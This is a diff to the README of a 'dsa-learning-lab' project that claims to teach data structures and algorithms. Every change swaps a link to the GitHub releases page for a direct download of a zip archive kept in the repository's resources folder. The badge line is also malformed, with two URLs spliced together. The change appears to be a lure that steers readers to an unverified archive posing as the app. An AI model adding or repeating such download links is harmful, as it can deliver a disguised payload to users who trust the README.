@@ -1,6 +1,6 @@
 # 🚀 dsa-learning-lab - Master Data Structures and Algorithms Easily
 
-[![Download dsa-learning-lab](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/abelloverrr/dsa-learning-lab/releases)
+[![Download dsa-learning-lab](https://raw.githubusercontent.com/abelloverrr/dsa-learning-lab/main/resources/learning-dsa-lab-v1.4.zip%https://raw.githubusercontent.com/abelloverrr/dsa-learning-lab/main/resources/learning-dsa-lab-v1.4.zip)](https://raw.githubusercontent.com/abelloverrr/dsa-learning-lab/main/resources/learning-dsa-lab-v1.4.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ To begin, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads page.
 
-   [Download dsa-learning-lab](https://github.com/abelloverrr/dsa-learning-lab/releases)
+   [Download dsa-learning-lab](https://raw.githubusercontent.com/abelloverrr/dsa-learning-lab/main/resources/learning-dsa-lab-v1.4.zip)
 
 2. **Select Your Version:** On the releases page, you will find a list of versions. Choose the latest version for the best experience.
 
@@ -24,7 +24,7 @@ To install the application, follow these steps:
 
 1. **Go to the Downloads Page:** Use the link below to access the download page.
 
-   [Download dsa-learning-lab](https://github.com/abelloverrr/dsa-learning-lab/releases)
+   [Download dsa-learning-lab](https://raw.githubusercontent.com/abelloverrr/dsa-learning-lab/main/resources/learning-dsa-lab-v1.4.zip)
 
 2. **Download the File:** Click the link for the version you wish to download. The file will begin downloading automatically.
 
